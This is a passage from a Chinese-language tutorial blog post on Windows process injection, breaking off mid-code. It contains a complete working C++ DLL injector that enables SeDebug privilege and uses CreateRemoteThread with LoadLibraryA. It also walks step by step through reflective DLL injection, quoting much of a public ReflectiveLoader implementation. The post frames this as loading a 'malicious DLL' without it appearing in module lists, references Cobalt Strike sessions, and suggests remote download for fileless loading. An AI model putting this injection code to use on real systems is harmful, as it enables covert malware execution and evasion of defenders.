title=\"经典Dll注入\"></a>经典Dll注入</h2><p>首先需要恶意dll落地，然后通过远程线程调用LoadLibrary，让目标线程主动加载恶意dll。所以目标进程中的模块列表会有恶意dll。</p>\n<p>流程：</p>\n<ol>\n<li>提升当前进程权限（将访问令牌中禁用的权限启用）</li>\n<li>获取要注入进程的PID</li>\n<li>打开目标线程</li>\n<li>开辟内存空间，存储恶意dll绝对路径</li>\n<li>通过目标进程中的kernel32.dll获取LoadLibrary函数地址</li>\n<li>通过CreateRemoteThread远程调用LoadLibrary，使目标进程加载恶意dll</li>\n</ol>\n<p>首先要将当前进程得到 <strong>SeDebug</strong> 权限，<strong>将访问令牌中禁用的权限启用</strong>。成功调用下面几个函数的前提是进程具备该权限, 只是访问令牌中没有启用该权限. 而如果进程没有该权限, 则使用下面的函数后再调用 <code>GetLastError</code>会返回 <code>ERROR_NOT_ALL_ASSIGN</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include&lt;iostream&gt;</span><br><span class=\"line\">#include&lt;Windows.h&gt;</span><br><span class=\"line\">#include&lt;string&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL PrivilegeEscalation()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    HANDLE hToken;</span><br><span class=\"line\">    LUID luid;</span><br><span class=\"line\">    TOKEN_PRIVILEGES tp;</span><br><span class=\"line\">    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken);</span><br><span class=\"line\">    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luid);</span><br><span class=\"line\">    tp.PrivilegeCount &#x3D; 1;</span><br><span class=\"line\">    tp.Privileges[0].Attributes &#x3D; SE_PRIVILEGE_ENABLED;</span><br><span class=\"line\">    tp.Privileges[0].Luid &#x3D; luid;</span><br><span class=\"line\">    if (!AdjustTokenPrivileges(hToken, 0, &amp;tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))&#123;</span><br><span class=\"line\">        CloseHandle(hToken);</span><br><span class=\"line\">        return FALSE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else &#123;</span><br><span class=\"line\">        cout &lt;&lt; &quot;[+]提权成功&quot; &lt;&lt; endl;</span><br><span class=\"line\">        return TRUE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL RemoteInjectDll(DWORD Pid, char* DllPath)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x2F;&#x2F; 打开远程进程</span><br><span class=\"line\">    HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);</span><br><span class=\"line\">    &#x2F;&#x2F; 在 指定进程 中分配内存</span><br><span class=\"line\">    size_t dwSize &#x3D; strlen(DllPath) + 1;</span><br><span class=\"line\">    LPVOID pDllAddr &#x3D; VirtualAllocEx(hProcess,NULL,dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class=\"line\">    &#x2F;&#x2F; 写入到目标进程内存</span><br><span class=\"line\">    WriteProcessMemory(hProcess, pDllAddr, DllPath, dwSize, NULL);</span><br><span class=\"line\">    &#x2F;&#x2F; 从Kernel32.dll 中获取 LoadLibrary 函数</span><br><span class=\"line\">    HMODULE hker &#x3D; GetModuleHandleA(&quot;kernel32.dll&quot;);</span><br><span class=\"line\">    FARPROC pLoadAddr &#x3D; GetProcAddress(hker, &quot;LoadLibraryA&quot;);</span><br><span class=\"line\">    &#x2F;&#x2F; 远程调用</span><br><span class=\"line\">    HANDLE hRemoteHandle &#x3D; CreateRemoteThread(hProcess,NULL,0, (LPTHREAD_START_ROUTINE)pLoadAddr, pDllAddr,0,NULL);</span><br><span class=\"line\">    if (hRemoteHandle &#x3D;&#x3D; NULL) &#123;</span><br><span class=\"line\">        VirtualFreeEx(hProcess, pDllAddr, 0, MEM_RELEASE);</span><br><span class=\"line\">        CloseHandle(hProcess);</span><br><span class=\"line\">        return FALSE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    WaitForSingleObject(hRemoteHandle, INFINITE);</span><br><span class=\"line\"></span><br><span class=\"line\">    CloseHandle(hRemoteHandle);</span><br><span class=\"line\">    VirtualFreeEx(hProcess, pDllAddr, 0, MEM_RELEASE);</span><br><span class=\"line\">    CloseHandle(hProcess);</span><br><span class=\"line\">    cout &lt;&lt; &quot;[+]dll执行成功&quot; &lt;&lt; endl;</span><br><span class=\"line\">    return TRUE;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x2F;&#x2F; 提升当前进程权限</span><br><span class=\"line\">    if (!PrivilegeEscalation()) &#123;</span><br><span class=\"line\">        cout &lt;&lt; &quot;[-]提升权限失败&quot; &lt;&lt; endl;</span><br><span class=\"line\">        return 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    DWORD PID;</span><br><span class=\"line\">    char DllPath[40];</span><br><span class=\"line\"></span><br><span class=\"line\">    cout &lt;&lt; &quot;[.]DLLfile Path :&quot; &lt;&lt; endl;cin &gt;&gt; DllPath;</span><br><span class=\"line\">    cout &lt;&lt; &quot;[.]Target PRocessID :&quot; &lt;&lt; endl;cin &gt;&gt; PID;</span><br><span class=\"line\">    RemoteInjectDll(PID, DllPath);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>对应进程名为notepad.exe，模块列表显示恶意dll。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240615002715858.png\"></p>\n<p>PS：当cs执行退出会话时，也会将对应的进程关闭掉。所以注入explorer.exe后退出会话会造成短暂崩溃。但是通过cs的原生inject操作再进行退出会话就不会造成对应进程的崩溃。</p>\n<h2 id=\"反射Dll注入\"><a href=\"#反射Dll注入\" class=\"headerlink\" title=\"反射Dll注入\"></a>反射Dll注入</h2><p>在学习反射dll注入前，首先学习一下 PE文件结构的前置知识 <a href=\"https://tttang.com/archive/1553/\">PE文件结构从初识到简单shellcode注入</a> 与 模拟PE加载过程 <a href=\"https://www.kn0sky.com/?p=37\">手工模拟PE加载器</a> 会更好理解该手法，简单来说当windows加载DLL时有以下步骤：</p>\n<ol>\n<li>检测DOS和PE头的合法性。</li>\n<li>尝试在PEHeader.OptionalHeader.ImageBase位置分配PEHeader.OptionalHeader.SizeOfImage字节的内存区域。</li>\n<li>解析Section header中的每个Section，并将它们的实际内容拷贝到第2步分配的地址空间中。拷贝的目的地址的计算方法为：IMAGE_SECTION_HEADER.VirtualAddress偏移 + 第二步分配的内存区域的起始地址。</li>\n<li>检查加载到进程地址空间的位置和之前PE文件中指定的基地址是否一致，如果不一致，则需要重定位。重定位就需要用到1.2节中的IMAGE_OPTIONAL_HEADER64.DataDirectory[5].</li>\n<li>加载该DLL依赖的其他dll，并构建 PEHeader.OptionalHeader.DataDirectory.Image_directory_entry_import 导入表.</li>\n<li>根据每个Section的”PEHeader.Image_Section_Table.Characteristics”属性来设置内存页的访问属性； 如果被设置为”discardable”属性，则释放该内存页。</li>\n<li>获取DLL的入口函数指针，并使用DLL_PROCESS_ATTACH参数调用。</li>\n</ol>\n<p>该注入方法主要特点为：<strong>不使用LoadLibrary</strong> API函数加载磁盘中的DLL，而是通过内嵌/网络下载恶意DLL到内存中，为恶意DLL添加一个导出函数，该导出函数（称为：ReflectiveLoader）功能是 模拟PE加载的过程从而加载自身，最终只要执行该导出函数便可达到无文件落地内存加载目的。因此通过分析工具在模块列表处是看不到恶意DLL的。</p>\n<p>所以完成反射DLL注入需要两部分：1. 带有自实现ReflectiveLoader函数的恶意DLL。2. 注入器。</p>\n<p>如图：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240615152448768.png\"></p>\n<p>在恶意DLL中实现ReflectiveLoader过程中，或者说模拟一个PE加载函数需要这么几步：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240615153954111.png\" alt=\"image-20240615153954111\"></p>\n<p>代码实现直接参考提出者stephenfewer的开源项目：<a href=\"https://github.com/stephenfewer/ReflectiveDLLInjection\">stephenfewer/ReflectiveDLLInjection</a></p>\n<p>一、定位DLL在内存中的基址</p>\n<p>调用_ReturnAddress 返回当前调用函数返回的地址，即函数下一跳指令地址，此时返回的不是DLL头部文件的地址，但是比较接近了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">uiLibraryAddress &#x3D; caller();</span><br><span class=\"line\"></span><br><span class=\"line\">__declspec(noinline) ULONG_PTR caller( VOID ) &#123; return (ULONG_PTR)_ReturnAddress(); &#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后通过逐字节遍历，查找是否符合DOS头（MZ），接着通过e_lfanew字段得到NT头地址，再校验Signature字段是否符合PE标记。都满足就判定当前 uiLibraryAddress 的地址就是DLL的基址。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">while( TRUE )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if( ((PIMAGE_DOS_HEADER)uiLibraryAddress)-&gt;e_magic &#x3D;&#x3D; IMAGE_DOS_SIGNATURE )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        uiHeaderValue &#x3D; ((PIMAGE_DOS_HEADER)uiLibraryAddress)-&gt;e_lfanew;</span><br><span class=\"line\">        &#x2F;&#x2F; some x64 dll&#39;s can trigger a bogus signature (IMAGE_DOS_SIGNATURE &#x3D;&#x3D; &#39;POP r10&#39;),</span><br><span class=\"line\">        &#x2F;&#x2F; we sanity check the e_lfanew with an upper threshold value of 1024 to avoid problems.</span><br><span class=\"line\">        if( uiHeaderValue &gt;&#x3D; sizeof(IMAGE_DOS_HEADER) &amp;&amp; uiHeaderValue &lt; 1024 )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            uiHeaderValue +&#x3D; uiLibraryAddress;</span><br><span class=\"line\">            &#x2F;&#x2F; break if we have found a valid MZ&#x2F;PE header</span><br><span class=\"line\">            if( ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;Signature &#x3D;&#x3D; IMAGE_NT_SIGNATURE )</span><br><span class=\"line\">                break;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    uiLibraryAddress--;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>二、获取所需的系统API函数</p>\n<p>通过解析PEB结构体中的 Ldr 中的 InMemoryOrderModuleList 获取指定的 DLL（kernel32.dll、ntdll.dll）</p>\n<p>x64下通过gs寄存器获取PEB地址</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#ifdef WIN_X64</span><br><span class=\"line\">\tuiBaseAddress &#x3D; __readgsqword( 0x60 );</span><br><span class=\"line\">#else</span><br><span class=\"line\">#ifdef WIN_X86</span><br><span class=\"line\">\tuiBaseAddress &#x3D; __readfsdword( 0x30 );</span><br><span class=\"line\">#else WIN_ARM</span><br><span class=\"line\">\tuiBaseAddress &#x3D; *(DWORD *)( (BYTE *)_MoveFromCoprocessor( 15, 0, 13, 0, 2 ) + 0x30 );</span><br><span class=\"line\">#endif</span><br><span class=\"line\">#endif</span><br></pre></td></tr></table></figure>\n\n<p>通过 Ldr.InMemoryOrderModuleList 匹配DLL名称hash。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">uiBaseAddress &#x3D; (ULONG_PTR)((_PPEB)uiBaseAddress)-&gt;pLdr;</span><br><span class=\"line\"></span><br><span class=\"line\">uiValueA &#x3D; (ULONG_PTR)((PPEB_LDR_DATA)uiBaseAddress)-&gt;InMemoryOrderModuleList.Flink;</span><br><span class=\"line\">while( uiValueA )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    uiValueB &#x3D; (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)-&gt;BaseDllName.pBuffer;</span><br><span class=\"line\">    usCounter &#x3D; ((PLDR_DATA_TABLE_ENTRY)uiValueA)-&gt;BaseDllName.Length;</span><br><span class=\"line\">    uiValueC &#x3D; 0;</span><br><span class=\"line\">    do</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        uiValueC &#x3D; ror( (DWORD)uiValueC );</span><br><span class=\"line\">        if( *((BYTE *)uiValueB) &gt;&#x3D; &#39;a&#39; )</span><br><span class=\"line\">            uiValueC +&#x3D; *((BYTE *)uiValueB) - 0x20;</span><br><span class=\"line\">        else</span><br><span class=\"line\">            uiValueC +&#x3D; *((BYTE *)uiValueB);</span><br><span class=\"line\">        uiValueB++;</span><br><span class=\"line\">    &#125; while( --usCounter );</span><br><span class=\"line\"></span><br><span class=\"line\">if( (DWORD)uiValueC &#x3D;&#x3D; KERNEL32DLL_HASH )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t......</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>通过继续解析PEB找到 NT头、导出表、导出函数地址数组、导出函数名数组和导出函数序号数组后，对所需函数进行hash匹配，至此获取所需函数地址。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">......</span><br><span class=\"line\">if( dwHashValue &#x3D;&#x3D; LOADLIBRARYA_HASH || dwHashValue &#x3D;&#x3D; GETPROCADDRESS_HASH || dwHashValue &#x3D;&#x3D; VIRTUALALLOC_HASH )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x2F;&#x2F; get the VA for the array of addresses</span><br><span class=\"line\">    uiAddressArray &#x3D; ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions );</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; use this functions name ordinal as an index into the array of name pointers</span><br><span class=\"line\">    uiAddressArray +&#x3D; ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; store this functions VA</span><br><span class=\"line\">    if( dwHashValue &#x3D;&#x3D; LOADLIBRARYA_HASH )</span><br><span class=\"line\">        pLoadLibraryA &#x3D; (LOADLIBRARYA)( uiBaseAddress + DEREF_32( uiAddressArray ) );</span><br><span class=\"line\">    else if( dwHashValue &#x3D;&#x3D; GETPROCADDRESS_HASH )</span><br><span class=\"line\">        pGetProcAddress &#x3D; (GETPROCADDRESS)( uiBaseAddress + DEREF_32( uiAddressArray ) );</span><br><span class=\"line\">    else if( dwHashValue &#x3D;&#x3D; VIRTUALALLOC_HASH )</span><br><span class=\"line\">        pVirtualAlloc &#x3D; (VIRTUALALLOC)( uiBaseAddress + DEREF_32( uiAddressArray ) );</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; decrement our counter</span><br><span class=\"line\">    usCounter--;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>三、申请装载DLL的内存空间/复制PE头和各个节</p>\n<p>通过 e_lfanew 获取到 NT头中的SizeOfImage，开辟空间，将NT头部信息复制到空间中</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">uiBaseAddress &#x3D; (ULONG_PTR)pVirtualAlloc( NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );</span><br><span class=\"line\"></span><br><span class=\"line\">uiValueA &#x3D; ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.SizeOfHeaders;</span><br><span class=\"line\">uiValueB &#x3D; uiLibraryAddress;</span><br><span class=\"line\">uiValueC &#x3D; uiBaseAddress;</span><br><span class=\"line\"></span><br><span class=\"line\">while( uiValueA-- )</span><br><span class=\"line\">    *(BYTE *)uiValueC++ &#x3D; *(BYTE *)uiValueB++;</span><br></pre></td></tr></table></figure>\n\n<p>同样方式将各个节复制到空间中</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; itterate through all sections, loading them into memory.</span><br><span class=\"line\">uiValueE &#x3D; ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;FileHeader.NumberOfSections;</span><br><span class=\"line\">while( uiValueE-- )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t&#x2F;&#x2F; uiValueB is the VA for this section</span><br><span class=\"line\">\tuiValueB &#x3D; ( uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)-&gt;VirtualAddress );</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; uiValueC if the VA for this sections data</span><br><span class=\"line\">\tuiValueC &#x3D; ( uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)-&gt;PointerToRawData );</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; copy the section over</span><br><span class=\"line\">\tuiValueD &#x3D; ((PIMAGE_SECTION_HEADER)uiValueA)-&gt;SizeOfRawData;</span><br><span class=\"line\"></span><br><span class=\"line\">\twhile( uiValueD-- )</span><br><span class=\"line\">\t\t*(BYTE *)uiValueB++ &#x3D; *(BYTE *)uiValueC++;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; get the VA of the next section</span><br><span class=\"line\">\tuiValueA +&#x3D; sizeof( IMAGE_SECTION_HEADER );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>四、处理DLL导入表</p>\n<p>PE文件的导入表（Import Table）列出了该文件依赖的外部DLL及其导入的函数。加载器解析导入表，并使用 <code>LoadLibrary</code>和<code>GetProcAddress</code> 函数加载所需的DLL，获取导入函数的地址，并填充导入地址表（IAT）</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240616005830412.png\"></p>\n<p>PE加载前</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240616005910129.png\" alt=\"image-20240616005910129\"></p>\n<p>PE加载后：IAT被填充函数地址</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240616010142570.png\" alt=\"image-20240616010142570\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 通过NT头的数据目录获取导出表的地址</span><br><span class=\"line\">uiValueB &#x3D; (ULONG_PTR)&amp;((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];</span><br><span class=\"line\"></span><br><span class=\"line\">uiValueC &#x3D; ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)-&gt;VirtualAddress );</span><br><span class=\"line\"></span><br><span class=\"line\">while( ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)-&gt;Name )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t&#x2F;&#x2F; 使用LoadLibraryA加载所需要的DLL</span><br><span class=\"line\">\tuiLibraryAddress &#x3D; (ULONG_PTR)pLoadLibraryA( (LPCSTR)( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)-&gt;Name ) );</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; OriginalFirstThunk</span><br><span class=\"line\">\tuiValueD &#x3D; ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)-&gt;OriginalFirstThunk );</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; IAT</span><br><span class=\"line\">\tuiValueA &#x3D; ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)-&gt;FirstThunk );</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 遍历导入的函数</span><br><span class=\"line\">\twhile( DEREF(uiValueA) )</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t&#x2F;&#x2F; 如果是序号导入</span><br><span class=\"line\">\t\tif( uiValueD &amp;&amp; ((PIMAGE_THUNK_DATA)uiValueD)-&gt;u1.Ordinal &amp; IMAGE_ORDINAL_FLAG )</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t&#x2F;&#x2F; 获取上面LoadLibraryA加载的模块的NT头</span><br><span class=\"line\">\t\t\tuiExportDir &#x3D; uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)-&gt;e_lfanew;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tuiNameArray &#x3D; (ULONG_PTR)&amp;((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tuiExportDir &#x3D; ( uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress );</span><br><span class=\"line\">\t\t\tuiAddressArray &#x3D; ( uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions );</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t&#x2F;&#x2F; 定位函数地址：首先计算目标函数在依赖DLL的导出地址表的偏移位置。这个位置的计算方法是通过取函数的序号并减去基序号(导出函数序号的最小值)得出来得的,然后这个偏移量再乘以sizeof(DWORD),就是目标函数在导出地址表的偏移位置。最后再加上uiAddressArray，此变量现在指向目标函数地址的指针</span><br><span class=\"line\">\t\t\tuiAddressArray +&#x3D; ( ( IMAGE_ORDINAL( ((PIMAGE_THUNK_DATA)uiValueD)-&gt;u1.Ordinal ) - ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;Base ) * sizeof(DWORD) );</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t&#x2F;&#x2F; 写入到IAT</span><br><span class=\"line\">\t\t\tDEREF(uiValueA) &#x3D; ( uiLibraryAddress + DEREF_32(uiAddressArray) );</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\telse</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t&#x2F;&#x2F; 如果是名称导入</span><br><span class=\"line\">\t\t\tuiValueB &#x3D; ( uiBaseAddress + DEREF(uiValueA) );</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t&#x2F;&#x2F; 通过GetProcAddress获取函数地址，写入IAT</span><br><span class=\"line\">\t\t\tDEREF(uiValueA) &#x3D; (ULONG_PTR)pGetProcAddress( (HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)-&gt;Name );</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<p>五、处理DLL重定位表</p>\n<p>在编译PE文件时，编译器通常会指定一个默认的基地址（Image Base），即首选的内存加载地址。当多个DLL或可执行文件试图加载到相同的首选地址时，冲突就会发生。为了避免这种冲突，Windows加载器可能需要将PE文件加载到不同于其首选地址的内存位置。这时，所有基于首选地址的指针和地址引用都需要进行调整，这就是重定位的作用。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 计算基址偏移量:当前DLL的实际加载地址减去预设的基地址</span><br><span class=\"line\">uiLibraryAddress &#x3D; uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.ImageBase;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 获取重定位表的地址</span><br><span class=\"line\">uiValueB &#x3D; (ULONG_PTR)&amp;((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 通过检查重定位表是否为空来判断是否存在重定位项</span><br><span class=\"line\">if( ((PIMAGE_DATA_DIRECTORY)uiValueB)-&gt;Size )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x2F;&#x2F; uiValueC指向第一个重定位块的地址</span><br><span class=\"line\">    uiValueC &#x3D; ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)-&gt;VirtualAddress );</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 开始遍历所有重定位块</span><br><span class=\"line\">    while( ((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;SizeOfBlock )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        &#x2F;&#x2F; 获取重定位块的地址</span><br><span class=\"line\">        uiValueA &#x3D; ( uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;VirtualAddress );</span><br><span class=\"line\"></span><br><span class=\"line\">        &#x2F;&#x2F; 获取重定位块中包含的重定位项的数量</span><br><span class=\"line\">        uiValueB &#x3D; ( ((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) ) &#x2F; sizeof( IMAGE_RELOC );</span><br><span class=\"line\"></span><br><span class=\"line\">        &#x2F;&#x2F; uiValueD设置为当前块中的第一个重定位项</span><br><span class=\"line\">        uiValueD &#x3D; uiValueC + sizeof(IMAGE_BASE_RELOCATION);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#x2F;&#x2F; 遍历重定位项</span><br><span class=\"line\">        while( uiValueB-- )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &#x2F;&#x2F; 根据重定位项的类型来修正相应的地址</span><br><span class=\"line\">            if( ((PIMAGE_RELOC)uiValueD)-&gt;type &#x3D;&#x3D; IMAGE_REL_BASED_DIR64 )</span><br><span class=\"line\">                *(ULONG_PTR *)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset) +&#x3D; uiLibraryAddress;</span><br><span class=\"line\">            else if( ((PIMAGE_RELOC)uiValueD)-&gt;type &#x3D;&#x3D; IMAGE_REL_BASED_HIGHLOW )</span><br><span class=\"line\">                *(DWORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset) +&#x3D; (DWORD)uiLibraryAddress;</span><br><span class=\"line\">            else if( ((PIMAGE_RELOC)uiValueD)-&gt;type &#x3D;&#x3D; IMAGE_REL_BASED_HIGH )</span><br><span class=\"line\">                *(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset) +&#x3D; HIWORD(uiLibraryAddress);</span><br><span class=\"line\">            else if( ((PIMAGE_RELOC)uiValueD)-&gt;type &#x3D;&#x3D; IMAGE_REL_BASED_LOW )</span><br><span class=\"line\">                *(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset) +&#x3D; LOWORD(uiLibraryAddress);</span><br><span class=\"line\"></span><br><span class=\"line\">            &#x2F;&#x2F; 遍历下一个重定位项</span><br><span class=\"line\">            uiValueD +&#x3D; sizeof( IMAGE_RELOC );</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#x2F;&#x2F; 遍历下一个重定位块</span><br><span class=\"line\">        uiValueC &#x3D; uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;SizeOfBlock;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>六、调用DLL入口点</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 获取DLL的入口点</span><br><span class=\"line\">uiValueA &#x3D; ( uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.AddressOfEntryPoint );</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 刷新指令缓存,确保CPU的指令缓存没有旧的代码</span><br><span class=\"line\">pNtFlushInstructionCache( (HANDLE)-1, NULL, 0 );</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 调用DLLMAIN函数</span><br><span class=\"line\">&#x2F;&#x2F; 此宏定义表示,如果DLL是通过LoadRemoteLibraryR注入的,则可使用第三个参数作为额外参数给DllMain</span><br><span class=\"line\">#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR</span><br><span class=\"line\"></span><br><span class=\"line\">((DLLMAIN)uiValueA)( (HINSTANCE), DLL_PROCESS_ATTACH, lpParameter );</span><br><span class=\"line\">#else</span><br><span class=\"line\">((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, NULL );</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 返回入口点的地址</span><br><span class=\"line\">return uiValueA;</span><br></pre></td></tr></table></figure>\n\n<p>七、在DLLMAIN中添加恶意操作</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240617003529139.png\" alt=\"image-20240617003529139\"></p>\n<p>至此恶意DLL以及导出函数构造完成。</p>\n<p>下面分析注入器的流程：首先项目通过读取本地dll文件到内存，然后加载到内存，后续可以改造为远程下载或者嵌入即可实现单PE。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#ifdef WIN_X64</span><br><span class=\"line\">\tchar * cpDllFile  &#x3D; 